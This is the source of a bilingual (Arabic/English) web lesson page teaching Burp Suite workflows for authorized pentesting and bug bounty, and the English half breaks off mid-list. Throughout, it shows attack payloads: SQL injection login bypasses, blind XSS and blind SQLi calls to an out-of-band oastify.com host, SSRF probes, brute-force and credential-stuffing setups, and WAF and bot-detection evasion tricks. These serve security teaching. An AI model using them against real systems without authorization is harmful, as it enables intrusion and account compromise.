"use client";
import { LessonShell, Section, Callout, Code, Analogy, TwoCol, Card, Step, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="burp-mastery">
      <L
        ar={
          <>
            <Section title="Burp مش proxy — هو غرفة العمليات">
              <Analogy>
                <p>الفرق بين اللي بيستخدم Burp كـ Postman، واللي بيستخدمه كـ Burp، يبان في 5 ثواني.</p>
                <p>الأول بيفتح Repeater، يعدّل قيمة، يبعت، يبص في الرد، يقفل.</p>
                <p>التاني بيفتح Burp، يدخل على Target → Scope الأول، يضبط Match &amp; Replace، يفتح Logger++، يحط Collaborator في الجيب، وبعدين يبدأ.</p>

                <p>- طب وايه الفرق يا حضرتك؟؟ الاتنين بيبعتوا requests!</p>

                <p>يا نجم الجيل.. الأول بيـ guess. التاني بيـ hunt. الفرق ساعتين شغل وصفر findings، مقابل ساعتين شغل و3 IDORs.</p>

                <p>Burp مش proxy بيعرض requests. Burp غرفة عمليات.</p>
              </Analogy>
              <Callout kind="danger" title="اوعى تشتغل من غير ورق">
                <p>Burp قانونية. استخدامها بره الـ scope = جريمة. مش &quot;ممكن مشكلة&quot; — جريمة فعلية، فيها قضايا، في كل دولة عاقلة.</p>
                <p>اشتغل دايماً جوه scope مكتوب:</p>
                <ul className="list-disc pe-6 space-y-1">
                  <li>pentest authorized بـ SOW موقّع.</li>
                  <li>bug bounty على program ليه scope محدد على HackerOne/Bugcrowd/Intigriti.</li>
                  <li>معملك (Juice Shop، DVWA، PortSwigger Academy، PortSwigger Web Security Academy).</li>
                </ul>
                <p>"الموقع شكله ضعيف، خلّيني أجرّب" — ده اللي بيوّدي السجن.</p>
              </Callout>
              <p className="opacity-80">
                الدرس ده مش "إيه هي Repeater". الدرس: إزاي اللي بياخدوا 50 ألف دولار من برامج Google وMicrosoft بيستخدموا الأداة. الفرق بين الـ workflow ده والمعتاد = الفرق بين البحث والـ guessing.
              </p>
            </Section>

            <Section title="الإصدارات والترخيص">
              <ul className="list-disc pe-6 space-y-2 opacity-90">
                <li><b>Community (مجاني)</b>: Proxy، Repeater، Decoder. الـ Intruder بطيء جداً (rate-limited)، مفيش scanner. كفاية للتعلم.</li>
                <li><b>Professional (~$475/سنة)</b>: Intruder سريع، Scanner، Collaborator، BCheck، Extender كامل. ده اللي 99% من المحترفين بيستخدموه.</li>
                <li><b>Enterprise</b>: للفرق وCI/CD. مالهاش علاقة بالـ pentest اليدوي.</li>
              </ul>
            </Section>

            <Section title="الإعداد — 10 دقايق هتوفر عليك سنين، وليه Target → Scope أول حاجة تفتحها">
              <p>اللي بيفتح Burp ويبدأ يـ click في Repeater من غير ما يضبط scope، بيعمل واحدة من اتنين:</p>
              <ul className="list-disc pe-6 space-y-1 opacity-90">
                <li>الـ HTTP history بتاعه بقت Twitter notifications، Gmail polling، Slack websockets، وكام request للهدف ضايعين في الزحمة.</li>
                <li>وجوه آخر يوم في الـ engagement لما يـ Save Project، الـ file بقى 8 جيجا، Burp بيتعلّق، والشغل اللي عمله بيضيع.</li>
              </ul>
              <p>Target → Scope مش "إعداد كمالي". هو الفرق بين engagement منظّم وعك مرتب.</p>

              <Step n={1} title="ركّب شهادة Burp في المتصفح">
                <p>من غير الشهادة مش هتشوف HTTPS. شغّل Burp، افتح المتصفح الـ embedded أو ظبط Firefox/Chrome.</p>
                <Code lang="bash">{`# 1) Burp يستمع على 127.0.0.1:8080
# 2) Firefox: Settings → Network → Manual proxy → 127.0.0.1:8080
# 3) زُر http://burp → Download CA → استورد للمتصفح كـ "Trusted CA for websites"
# أو استخدم Foxy Proxy + Burp embedded browser (الأسهل)`}</Code>
              </Step>
              <Step n={2} title="ظبط الـ Scope">
                <p><b>أهم خطوة في الموضوع كله</b>. من غير scope، Burp بيسجل كل request من المتصفح (Twitter، Gmail، أي حاجة) والـ history بتختنق.</p>
                <Code lang="text">{`Target → Scope → Add
Use advanced scope control → Include in scope:
  Protocol: Any
  Host: ^.*\\.target\\.com$
  Port: ^443$
ثم في Proxy → Options → "Drop all out-of-scope items"`}</Code>
              </Step>
              <Step n={3} title="إعدادات Repeater وIntruder عشان السرعة">
                <Code lang="text">{`User options → Misc → Updates → Disable auto-update
User options → Display → Font → ضع Mono و كبّره
Project options → Sessions → Cookie jar = scope only
Project options → HTTP → Redirections = Always (في scope)`}</Code>
              </Step>
              <Step n={4} title="الـ Extensions الأساسية (BApp Store)">
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>Logger++</b>: سجل قابل للبحث لكل request — مينفعش من غيره.</li>
                  <li><b>Autorize</b>: بيفحص IDOR/Auth أوتوماتيك عن طريق إعادة الـ request بـ session تانية.</li>
                  <li><b>Hackvertor</b>: ترميز/فك ترميز بكل الأشكال (URL, base64, Unicode, JWT).</li>
                  <li><b>JSON Web Tokens</b>: تعديل JWT وإعادة توقيع.</li>
                  <li><b>Param Miner</b>: اكتشاف parameters/headers مش موثقة.</li>
                  <li><b>Turbo Intruder</b>: 30 ألف request/ثانية + single-packet attack.</li>
                  <li><b>HTTP Request Smuggler</b>: كشف واستغلال desync.</li>
                  <li><b>Active Scan++</b>: امتداد للـ scanner المدمج.</li>
                  <li><b>Backslash Powered Scanner</b>: للـ injection bugs العميقة.</li>
                </ul>
              </Step>
            </Section>

            <Section title="Proxy — تلقّط وتعديل">
              <p className="opacity-90">القلب. كل request بيعدي من هنا الأول. <b>اقفل Intercept افتراضياً</b> (إلا لو محتاجه) — اشتغل من الـ HTTP History.</p>
              <Code lang="text">{`Proxy → HTTP history
كليك يمين على طلب:
  → Send to Repeater (Ctrl+R)        — لتعديل و تكرار يدوي
  → Send to Intruder (Ctrl+I)        — لـ fuzzing
  → Send to Comparer                 — للـ diff بين ردين
  → Do active scan                   — لفحص آلي (Pro)
  → Engagement tools → Find references — أين يظهر هذا الـ endpoint`}</Code>
              <Callout kind="warn" title="حيلة احترافية">
                <p>Match &amp; Replace في Proxy → Options:
                  حط header زي <code>X-Forwarded-For: 127.0.0.1</code> على كل request أوتوماتيك، أو شيل <code>If-Modified-Since</code> عشان تخلي السيرفر يرد بالداتا الحية.</p>
              </Callout>
            </Section>

            <Section title="Repeater — قصة صيد IDOR من البداية للآخر">
              <p className="opacity-90">90% من شغل bug bounty بيحصل في Repeater. أتقنه وإنت حر.</p>
              <p className="opacity-90">بس بدل ما أقولك "Ctrl+R و Send"، خليني أوريك سيناريو حقيقي.</p>

              <h3>السيتاب</h3>
              <p>هدف SaaS، فيه dashboard، كل user عنده <code>account_id</code>. إنت سجّلت user، account_id بتاعك = 8419. الـ API call اللي بيجيب الـ profile:</p>
              <Code lang="text">{`GET /api/v2/account/8419/profile HTTP/1.1
Host: app.target.com
Authorization: Bearer eyJhbGc...
Cookie: session=abc123`}</Code>

              <h3>الخطوات اللي محترف بيعملها — بالترتيب</h3>
              <ol className="list-decimal pe-6 space-y-2 opacity-90">
                <li>سجّلت account تاني بـ email مختلف من <code>+aliasing</code>. account_id الجديد = 8420. ده الـ "victim" في الـ test.</li>
                <li>من الـ user الأول، Send to Repeater على الـ profile request.</li>
                <li>غيّرت 8419 لـ 8420. Send.
                  <ul className="list-disc pe-6">
                    <li>لو رجعت داتا الـ user التاني = IDOR كامل، critical.</li>
                    <li>لو 403 = backend بيتشيك. كويس.</li>
                    <li>لو 404 = ممكن enumerable، ممكن لأ. اعمل diff على الـ Length و الـ Time.</li>
                  </ul>
                </li>
                <li>جرّبت الـ casing: <code>Account/8420</code>، <code>ACCOUNT/8420</code>. أحياناً الـ routing case-insensitive والـ authz case-sensitive.</li>
                <li>جرّبت method confusion: GET → POST، GET → PUT. الـ <code>GET</code> ممكن يبقى مقفول والـ <code>PUT</code> فاتح من سهو.</li>
                <li>ضفت parameter pollution: <code>?account_id=8419&amp;account_id=8420</code>. الـ middleware بياخد الأول، الـ controller بياخد التاني.</li>
                <li>غيّرت الـ Authorization لـ token اتاني (الـ user التاني)، وسبت الـ URL على 8419. الـ Autorize extension بتعمل ده أوتوماتيك.</li>
                <li>جرّبت headers مخفية: <code>X-Original-URL: /api/v2/account/8420/profile</code>. أحياناً الـ reverse proxy بيوثق على الـ outer URL والـ app بيعمل route على الـ inner.</li>
              </ol>
              <p>لقيت إن الـ method confusion شغّال؟ Send to Comparer قارن الردود. سجّل الـ request بـ Add comment ("IDOR via PUT method, confirmed"). ضع color = green في الـ tab. كمّل.</p>
              <p>ده <b>Repeater</b>. مش زر Send.</p>

              <ol className="list-decimal pe-6 space-y-2 opacity-90">
                <li><b>الـ Tabs ملونة</b>: كليك يمين → Color. أحمر = ضعيف، أخضر = critical، أصفر = لسة بفحصه.</li>
                <li><b>Ctrl+Space للإكمال</b> جوه القيم.</li>
                <li><b>Inspector panel</b>: عدّل JSON/headers/params كجدول، الـ raw request بيتبني لوحده.</li>
                <li><b>Send group in single packet</b>: أساس race conditions (Ctrl+Shift+G لكل الـ tabs).</li>
                <li><b>Show response in browser</b>: تشوف الرد اللي فيه HTML/JS زي ما هو صفحة كاملة (مفيد للـ XSS).</li>
              </ol>
              <Code lang="text">{`# سيناريو نموذجي:
1) لقطت طلب login من الـ Proxy
2) Send to Repeater → غيّر username لـ admin' OR 1=1--
3) Send → لاحظ الفرق في الرد
4) لو فيه نتيجة: احفظ الـ request كـ "vulnerable-login.req" → Save items`}</Code>
            </Section>

            <Section title="Intruder — 4 أوضاع، 4 سيناريوهات حقيقية">
              <p className="opacity-90">الـ Intruder مش "اخترلي وضع". كل وضع له شغل. لو خلطت بينهم، النتيجة مش هتطلع.</p>
              <TwoCol>
                <Card title="Sniper — موضع واحد، list واحدة" color="amber">
                  <p><b>السيناريو:</b> عندك endpoint <code>/api/user/§1§/profile</code> وعايز تعمل enumeration على account IDs.</p>
                  <p>سؤال واحد: "هل الـ ID ده موجود؟". list واحدة، position واحد.</p>
                  <Code lang="text">{`GET /api/user/§1§ HTTP/1.1
Payload: numbers 1..1000`}</Code>
                </Card>
                <Card title="Battering Ram — نفس القيمة في كل مكان" color="amber">
                  <p><b>السيناريو:</b> نموذج تسجيل بيطلب username + email. عايز تجرّب لو الـ backend بيستخدم نفس الحقل في validation.</p>
                  <p>قيمة واحدة، اتحقن في كل positions في نفس الوقت. مفيد لـ SSTI testing وللحالات اللي البـ field بيتحطف فيها.</p>
                </Card>
                <Card title="Pitchfork — listتين متوازيتين" color="amber">
                  <p><b>السيناريو:</b> credential stuffing من dump. كل user له password واحد محدد، مش كل combination.</p>
                  <p>list 1 = users.txt، list 2 = passwords.txt. الطلب الأول بياخد user[0]+pass[0]، التاني user[1]+pass[1]، وهكذا. لو فيه فرق في عدد الـ entries، Burp بيقف عند الأقل.</p>
                </Card>
                <Card title="Cluster Bomb — كل combination" color="amber">
                  <p><b>السيناريو:</b> brute-force كامل. 100 username × 100 password = 10,000 طلب.</p>
                  <Code lang="text">{`POST /login
user=§§ &amp; pass=§§
Payload set 1: users.txt
Payload set 2: passwords.txt`}</Code>
                  <p>التحذير: ده اللي بيحرق الـ rate limit. شغّله وإنت عارف إن الـ account هيتقفل أو الـ IP هيـ block. على الـ Community بطيء جداً — هنا تستخدم Turbo Intruder.</p>
                </Card>
              </TwoCol>
              <Callout kind="warn" title="تحليل الردود">
                <p>الـ Intruder مش هيقولك "ده نجح" — إنت اللي بتستخرج الإشارة:</p>
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>Length</b>: الرد الناجح غالباً طوله مختلف.</li>
                  <li><b>Status code</b>: 200 وسط بحر من 401 = إصابة.</li>
                  <li><b>Grep - Match</b>: علّم الردود اللي فيها "Welcome" أو "error".</li>
                  <li><b>Grep - Extract</b>: استخرج قيمة (زي CSRF token جديد).</li>
                  <li><b>Time</b>: رتّب على عمود Time للـ blind time-based.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Collaborator — لما الهدف ساكت بس بيتكلم من ضهره">
              <Analogy>
                <p>Collaborator domain عام بيلقط أي DNS/HTTP/SMTP يوصله.</p>
                <p>سيناريو: إنت بتختبر export PDF feature. بتحط <code>http://x.oastify.com/poll</code> في حقل image_url. الـ PDF رجع طبيعي، مفيش error، مفيش حاجة شكلها مهمة في الرد.</p>
                <p>تفتح Collaborator → Poll Now.</p>
                <p>تلاقي:</p>
                <ul className="list-disc pe-6">
                  <li>DNS lookup من IP بتاع AWS داخلي للهدف.</li>
                  <li>HTTP GET من <code>headless-chrome/119.0</code>.</li>
                </ul>
                <p>الكلام ده معناه: السيرفر فتح الـ URL بـ headless browser، من جوه VPC. SSRF مؤكد، وممكن تتطور لـ access على metadata endpoint.</p>
                <p>الـ response ما قالش حاجة. الـ Collaborator هو اللي صرخ.</p>
              </Analogy>
              <Code lang="text">{`Burp → Collaborator → Copy to clipboard
استبدل في Repeater:
GET /fetch?url=http://YOUR-COLLAB.oastify.com/probe HTTP/1.1
↓ Send
↓ ارجع لـ Collaborator → Poll now → ستجد:
   - DNS lookup من target's IP
   - HTTP GET من user-agent معيّن
= SSRF/SSTI/XXE مؤكدة بدون ضرر`}</Code>
              <Callout kind="warn" title="حالات استخدام">
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>Blind XSS</b>: حقن <code>&lt;script src=https://x.oastify.com/x.js&gt;</code> — انتظر assistant/admin يفتح صفحة.</li>
                  <li><b>Blind SQLi</b>: <code>'; SELECT load_file('\\\\\\\\x.oastify.com\\\\share') --</code></li>
                  <li><b>Blind XXE</b>: external entity تشير لـ Collaborator.</li>
                  <li><b>SSRF</b>: استبدل أي URL في request بـ subdomain جديد.</li>
                  <li><b>Email injection</b>: SMTP probe في حقل البريد.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="BCheck — قصة كتابة check لـ bug شفته بنفسك">
              <p className="opacity-90">
                الـ Scanner المدمج كويس. بس قوة Burp الحقيقية في BCheck — لغة DSL تكتبها مرة، وتشتغل على كل engagement بعد كده.
              </p>
              <p className="opacity-90"><b>السيناريو:</b> لقيت في engagement سابق إن في endpoint اسمه <code>/debug.php</code> بيظهر بيانات الـ DB لو الـ <code>X-Debug</code> header موجود. بطّلت الـ engagement ده. بس الـ pattern ده ممكن يكون موجود عند زبون تاني، أو شركة تانية في نفس الـ vertical.</p>
              <p className="opacity-90">بدل ما تتذكر تجرّبه يدوي كل مرة، اكتبه BCheck:</p>
              <Code lang="text">{`metadata:
    language: v2-beta
    name: "Detect debug.php"
    description: "ارسل /debug.php و افحص رد"
    author: "you"

run for each:
    debug_path =
        "/debug.php",
        "/debug.html",
        "/.env"

given any host then
    send request called check:
        method: "GET"
        path: \`{debug_path}\`
    if {check.response.status_code} is "200" and
       {check.response.body} matches "DB_PASSWORD" then
        report issue:
            severity: high
            confidence: certain
            detail: \`Sensitive file at {debug_path}\`
    end if`}</Code>
              <p className="opacity-80 mt-2">
                ملفات الـ BCheck بتروح في <code>~/AppData/Roaming/BurpSuite/bchecks/</code> وبعدين Scanner → Issues → BChecks → Reload.
              </p>
            </Section>

            <Section title="Comparer + Decoder + Sequencer">
              <ul className="list-disc pe-6 space-y-2 opacity-90">
                <li><b>Comparer</b>: <i>Words/Bytes</i> diff بين ردين. مفيد جداً للـ blind boolean — قارن رد <code>id=1</code> بـ <code>id=1' OR 1=1--</code>.</li>
                <li><b>Decoder</b>: ترميز/فك ترميز بكليك. base64، URL، HTML، Hex، Hash. وتقدر ترص عمليات فوق بعض.</li>
                <li><b>Sequencer</b>: تحليل عشوائية tokens (session ID, CSRF). بيلم 10 آلاف+ token ويحسب الـ entropy. مفيد لما الـ RNG يبقى ضعيف.</li>
              </ul>
            </Section>

            <Section title="Match & Replace — قوة خفية">
              <Code lang="text">{`Proxy → Options → Match and Replace → Add:
Type: Request header
Match: ^User-Agent: .*
Replace: User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)
[ ] Regex match`}</Code>
              <ul className="list-disc pe-6 space-y-1 opacity-90 mt-2">
                <li>تتخطى bot detection بانتحال Googlebot.</li>
                <li>تحط <code>X-Forwarded-For: 127.0.0.1</code> عشان تتخطى IP allowlist.</li>
                <li>تشيل <code>Origin</code> عشان تختبر CORS.</li>
                <li>استبدال JWT أوتوماتيك في كل request.</li>
                <li>حقن debugger statement في كل JS بيرجع.</li>
              </ul>
            </Section>

            <Section title="Macros و Sessions — للـ workflows المعقدة">
              <p className="opacity-90">
                التطبيق بيطلب CSRF token جديد لكل request؟ Burp يقدر يستخرجه من رد سابق ويحقنه أوتوماتيك.
              </p>
              <Code lang="text">{`Project options → Sessions → Macros → Add
1) سجّل: GET /login → استخرج _csrf من body
2) Session handling rule:
   Scope: matches /api/*
   Action: Run macro to get _csrf, then update _csrf parameter`}</Code>
              <p className="opacity-80 mt-2">
                النتيجة: الـ Intruder/Scanner بيشتغلوا على تطبيق محمي بـ CSRF من غير أي شغل يدوي.
              </p>
            </Section>

            <Section title="Turbo Intruder — للسرعة الجادة وSingle-Packet">
              <Code lang="python">{`# Burp → Extender → Turbo Intruder → New attack
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=False,
        engine=Engine.BURP2
    )
    # لـ race condition — single packet
    for i in range(30):
        engine.queue(target.req)
    engine.openGate()

def handleResponse(req, interesting):
    if "success" in req.response:
        table.add(req)`}</Code>
              <p className="opacity-80 mt-2">
                30 ألف request/ثانية ممكن. استخدمه ضد credential stuffing على بيئتك، أو race على coupon redemption.
              </p>
            </Section>

            <Section title="نصايح بيستخدمها أبطال bug bounty">
              <ol className="list-decimal pe-6 space-y-2 opacity-90">
                <li><b>كل project = ملف لوحده</b>. File → New project → Disk-based. متخلطش الأهداف.</li>
                <li><b>احفظ كل ساعة</b>. Burp بيتعلق أحياناً مع الـ projects الكبيرة.</li>
                <li><b>Logger++ شغال من أول يوم</b>. هتحتاج تدور على "فين شفت الـ parameter ده؟" بعد أسبوع.</li>
                <li><b>اكتب Notes في Repeater</b>: كليك يمين → Add comment. سرعة الكتابة دلوقتي = سرعة التقرير بعدين.</li>
                <li><b>دور في الـ History بـ Bambdas</b>: <code>requestResponse.request().urlContains("graphql")</code> → فلتر فوري.</li>
                <li><b>شغل Param Miner قبل أي حاجة</b>: ممكن يكشف <code>X-Original-URL</code> أو header مخفي بيفتح كل حاجة.</li>
                <li><b>متعتمدش على الـ Active Scanner لوحده</b>. هو بيلاقي 30%، الباقي يدوي.</li>
                <li><b>Save state قبل أي تجربة خطرة</b>. لو طلعت الـ session، تقدر ترجع.</li>
                <li><b>Burp Collaborator دايماً شغال</b>. ربع ثغراتي الحقيقية كانت OOB.</li>
                <li><b>اقرا الـ Release Notes لكل تحديث</b>. PortSwigger بيضيف تكنيكات قتل (زي Inspector) كل شوية.</li>
              </ol>
            </Section>

            <Section title="الحماية — WAF بيقفل Burp إزاي، والـ Burp users بيعدّوها إزاي">
              <Callout kind="good" title="من جنب الـ defense">
                <p>الـ WAF الحديث (Cloudflare، Akamai، AWS WAF، F5) عنده signatures لـ Burp users:</p>
                <ul className="list-disc pe-6 space-y-1">
                  <li><b>Default User-Agent fingerprint:</b> Burp بيـ leave headers زي <code>Connection: close</code> بشكل ثابت، وترتيب الـ headers مختلف عن المتصفح.</li>
                  <li><b>JA3/JA4 TLS fingerprint:</b> الـ TLS handshake بتاع Burp بصمته معروفة. CDN بيشوفها.</li>
                  <li><b>Rate signature:</b> Intruder بـ default بيبعت requests كل 0ms. الـ WAF بيشوف الـ pattern ده فوراً.</li>
                  <li><b>Payload signatures:</b> الـ Active Scanner بيبعت payloads ثابتة (<code>'or'1'='1</code>، الـ XSS canary). WAF rules بتعرفها.</li>
                </ul>
              </Callout>

              <p className="opacity-90"><b>وكيف الـ Burp users بيعدّوا الـ controls دي:</b></p>
              <ul className="list-disc pe-6 space-y-1 opacity-90">
                <li>Match &amp; Replace على User-Agent يخلّيه User-Agent متصفح حديث.</li>
                <li>Intruder → Resource Pool → max concurrent requests = 1، delay = 2-5 ثواني. Slow Intruder بيعدّي تحت الـ rate limit.</li>
                <li>Random throttle عشان ما يبقاش الـ delay ثابت. الـ WAF بيـ flag الـ regular intervals.</li>
                <li>الـ TLS fingerprint مشكلة معقدة. الحل: use Caido أو شغّل Burp ورا curl-impersonate.</li>
                <li>Active Scanner؟ ما بتشغّلوش على هدف عنده WAF حساس. شغّل Nuclei من بره الأول، Burp يدوي على اللي ظهر.</li>
              </ul>

              <p className="opacity-90"><b>الدرس للـ defender:</b> User-Agent filtering لوحده مش كفاية. لازم correlation: rate + payload signatures + session anomaly. والأهم: false positive rate. WAF بيـ block ناس حقيقيين كل يوم.</p>
            </Section>

            <Section title="بدائل Burp — بصراحة، إمتى تستخدم إيه">
              <ul className="list-disc pe-6 space-y-2 opacity-90">
                <li><b>Caido</b>: 2024+، Rust، UI أحدث وأسرع من Burp بمراحل. الـ feature parity مش كاملة لسة، بس لو بتعمل web testing ومش محتاج كل extension في BApp Store، Caido فعلاً أحسن experience. أنا بستخدمه على engagements صغيرة، Burp على الكبيرة.</li>
                <li><b>OWASP ZAP</b>: مجاني خالص. الـ CLI ممتاز للـ CI/CD pipelines. بس الـ UI بطيئة، والـ extension ecosystem أصغر بكتير. يصلح كـ scanner في pipeline، مش كـ daily driver.</li>
                <li><b>mitmproxy</b>: terminal-based. لو بتختبر mobile app أو IoT، mitmproxy بيكسبهم بسهولة. Python scripting قوي. بس مش UI لـ manual testing تفصيلي.</li>
                <li><b>HTTP Toolkit</b>: للـ developer debug أكتر من attack. ممتاز للموبايل/desktop apps لإن بيـ auto-intercept. مش بديل Burp في pentest.</li>
              </ul>
              <p className="opacity-90">والكلام الفارغ المعتاد: &quot;أنا بستخدم ZAP لإنه مجاني&quot;. Burp Pro بـ ~$475/سنة. لو شغلك pentest، ده تكلفة ساعة شغل واحدة. بطّل الـ false economy دي.</p>
            </Section>

            <Section title="الخلاصة الناشفة">
              <p>Burp مش proxy.</p>
              <p>Burp مش &quot;Postman للهاكرز&quot;.</p>
              <p>Burp هو الفرق بين البحث والـ guessing.</p>
              <p>اللي بيـ guess: ساعتين شغل، صفر findings.</p>
              <p>اللي بيبحث: ساعتين شغل، 3 IDORs و 2 SSRFs.</p>
              <p>الفرق مش في الأداة. الفرق في الـ workflow.</p>
              <p>اكتبها على ظهر إيدك: أول 100 ساعة في Burp إنت &quot;بتتعلم&quot;. أول 1000 ساعة إنت &quot;بتشتغل&quot;. بعد 5000 ساعة، إنت بتشوف bug ما حدش شافه.</p>
              <p>ابدأ. PortSwigger Web Security Academy. مجاني. كل lab. لحد ما الـ Repeater يبقى زي إيدك.</p>
              <p>ولما يبقى زي إيدك — هتلاقي إن العالم كله مفتوح.</p>
            </Section>

            <Section title="مصادر عشان تتقن الموضوع">
              <ul className="list-disc pe-6 space-y-1 opacity-90">
                <li><b>PortSwigger Web Security Academy</b> — مجاني، بيعلمك Burp والثغرات مع بعض.</li>
                <li><b>BApp Store</b> — راجعه كل شهر، فيه إضافات جديدة بانتظام.</li>
                <li><b>YouTube: PortSwigger Research</b> — James Kettle بيكشف تكنيكات قبل ما تطلع في Burp.</li>
                <li><b>Twitter / X</b>: تابع <code>@albinowax</code>, <code>@Rhynorater</code>, <code>@JHaddix</code>.</li>
              </ul>
            </Section>
          </>
        }
        en={
          <>
            <Section title="What is Burp Suite — and why pros depend on it">
              <Analogy>
                Picture the browser as a window. Burp puts a reading desk between you and the site: every request passes
                through it — you can capture it, edit it, replay it a thousand times, or scan it automatically. It's not
                a "hack-for-me" tool — it's a <b>magnifying glass plus a wrench</b> that turns the browser into a lab.
              </Analogy>
              <Callout kind="danger" title="Authorized use only">
                Burp itself is fully legal, but using it on out-of-scope targets is a crime. Always work inside a written
                scope: pentest, bug bounty, or your own lab (Juice Shop, DVWA, PortSwigger Academy).
              </Callout>
              <p className="opacity-80">
                This lesson is purely practical: not "what is Repeater?" — but <b>how the bug bounty top earners use it</b>
                to find the bugs Google or Microsoft pay $50k for.
              </p>
            </Section>

            <Section title="Editions and licensing">
              <ul className="list-disc ps-6 space-y-2 opacity-90">
                <li><b>Community (free)</b>: Proxy, Repeater, Decoder. Intruder is rate-limited; no Scanner. Fine for learning.</li>
                <li><b>Professional (~$475/yr)</b>: full-speed Intruder, Scanner, Collaborator, BCheck, Extender. What 99% of pros use.</li>
                <li><b>Enterprise</b>: for teams and CI/CD. Not relevant to manual pentesting.</li>
              </ul>
            </Section>

            <Section title="First-time setup — 10 minutes that save you years">
              <Step n={1} title="Install the Burp CA in your browser">
                <p>Without the cert you can't see HTTPS. Start Burp, then either use the embedded browser, or configure Firefox/Chrome.</p>
                <Code lang="bash">{`# 1) Burp listens on 127.0.0.1:8080
# 2) Firefox: Settings → Network → Manual proxy → 127.0.0.1:8080
# 3) Visit http://burp → Download CA → import as "Trusted CA for websites"
# Or use FoxyProxy + the Burp embedded browser (easiest)`}</Code>
              </Step>
              <Step n={2} title="Set the Scope">
                <p><b>The single most important step.</b> Without scope, Burp logs every request from your browser (Twitter, Gmail, etc.) and history drowns.</p>
                <Code lang="text">{`Target → Scope → Add
Use advanced scope control → Include in scope:
  Protocol: Any
  Host: ^.*\\.target\\.com$
  Port: ^443$
Then Proxy → Options → "Drop all out-of-scope items"`}</Code>
              </Step>
              <Step n={3} title="Tune Repeater & Intruder">
                <Code lang="text">{`User options → Misc → Updates → Disable auto-update
User options → Display → Font → Mono, larger
Project options → Sessions → Cookie jar = scope only
Project options → HTTP → Redirections = Always (in scope)`}</Code>
              </Step>
              <Step n={4} title="Essential extensions (BApp Store)">
                <ul className="list-disc ps-6 space-y-1">
                  <li><b>Logger++</b>: searchable log of every request — indispensable.</li>
                  <li><b>Autorize</b>: auto-tests IDOR/auth by replaying requests as another session.</li>
                  <li><b>Hackvertor</b>: encode/decode in any flavor (URL, base64, Unicode, JWT).</li>
                  <li><b>JSON Web Tokens</b>: edit and re-sign JWTs.</li>
                  <li><b>Param Miner</b>: discover undocumented parameters and headers.</li>
                  <li><b>Turbo Intruder</b>: 30k req/s + single-packet attack.</li>
                  <li><b>HTTP Request Smuggler</b>: detect and exploit desync.</li>
                  <li><b>Active Scan++</b>: extends the built-in scanner.</li>
                  <li><b>Backslash Powered Scanner</b>: deep injection bug discovery.</li>
                </ul>
              </Step>
            </Section>

            <Section title="Proxy — capture and modify">
              <p className="opacity-90">The heart. Every request passes through it first. <b>Disable Intercept by default</b> — work from HTTP History.</p>
              <Code lang="text">{`Proxy → HTTP history
Right-click a request:
  → Send to Repeater (Ctrl+R)         — manual edit + replay
  → Send to Intruder (Ctrl+I)         — fuzzing
  → Send to Comparer                  — diff two responses
  → Do active scan                    — automated scan (Pro)
  → Engagement tools → Find references — where this endpoint appears`}</Code>
              <Callout kind="warn" title="Pro trick">
                <p>Match &amp; Replace under Proxy → Options:
                  auto-inject <code>X-Forwarded-For: 127.0.0.1</code> on every request, or strip <code>If-Modified-Since</code> to force fresh responses.</p>
              </Callout>
            </Section>

            <Section title="Repeater — your four loyal friends">
              <p className="opacity-90">90% of bug bounty work happens here. Master it and you're free.</p>
              <ol className="list-decimal ps-6 space-y-2 opacity-90">
                <li><b>Color-code your tabs</b>: right-click → Color. Red = weak, green = critical, yellow = investigating.</li>
                <li><b>Ctrl+Space autocomplete</b> inside values.</li>
                <li><b>Inspector panel</b>: edit JSON/headers/params as a table; the raw request rebuilds itself.</li>
                <li><b>Send group in single packet</b>: foundation of race-condition attacks (Ctrl+Shift+G across tabs).</li>
                <li><b>Show response in browser</b>: render an HTML/JS response as a real page (great for XSS).</li>
              </ol>
              <Code lang="text">{`# Typical flow:
1) Capture login from Proxy
2) Send to Repeater → change username to admin' OR 1=1--
3) Send → notice response difference
4) If interesting: save the request as "vulnerable-login.req" → Save items`}</Code>
            </Section>

            <Section title="Intruder — pro-grade fuzzing">
              <p className="opacity-90">Send thousands of requests with varying values. Four modes:</p>
              <TwoCol>
                <Card title="Sniper (single)" color="amber">
                  <p>One list, one position per request. Basic fuzzing.</p>
                  <Code lang="text">{`GET /api/user/§1§ HTTP/1.1
Payload: numbers 1..1000`}</Code>
                </Card>
                <Card title="Battering Ram" color="amber">
                  <p>Same value in every position. For testing one credential across multiple fields.</p>
                </Card>
                <Card title="Pitchfork" color="amber">
                  <p>Two parallel lists. For user/password pairs.</p>
                </Card>
                <Card title="Cluster Bomb" color="amber">
                  <p>Every combination across two or more lists. Full brute-force.</p>
                  <Code lang="text">{`POST /login
user=§§ &amp; pass=§§
Payload set 1: users.txt
Payload set 2: passwords.txt`}</Code>
                </Card>
              </TwoCol>
              <Callout kind="warn" title="Reading the responses">
                <p>Intruder doesn't tell you "this worked" — you extract the signal:</p>
                <ul className="list-disc ps-6 space-y-1">
                  <li><b>Length</b>: a successful response is usually a different size.</li>
                  <li><b>Status code</b>: a single 200 in a sea of 401s = a hit.</li>
                  <li><b>Grep - Match</b>: flag responses containing "Welcome" or "error".</li>
                  <li><b>Grep - Extract</b>: extract a value (like a fresh CSRF token).</li>
                  <li><b>Time</b>: sort by Time column for blind time-based attacks.</li>
                </ul>
              </Callout>
            </Section>

            <Section title="Collaborator — the canary that screams from inside">
              <Analogy>
                Collaborator is a public domain that catches any DNS/HTTP/SMTP that reaches it. If your payload caused
                the server to look up <code>abcdefg.oastify.com</code>, you know your code ran — even if no response
                came back.
              </Analogy>
              <Code lang="text">{`Burp → Collaborator → Copy to clipboard
In Repeater:
GET /fetch?url=http://YOUR-COLLAB.oastify.com/probe HTTP/1.1
↓ Send
↓ Back to Collaborator → Poll now → you'll see:
   - DNS lookup from target's IP
   - HTTP GET with that user-agent
= SSRF/SSTI/XXE confirmed without harm`}</Code>
              <Callout kind="warn" title="Use cases">
                <ul className="list-disc ps-6 space-y-1">
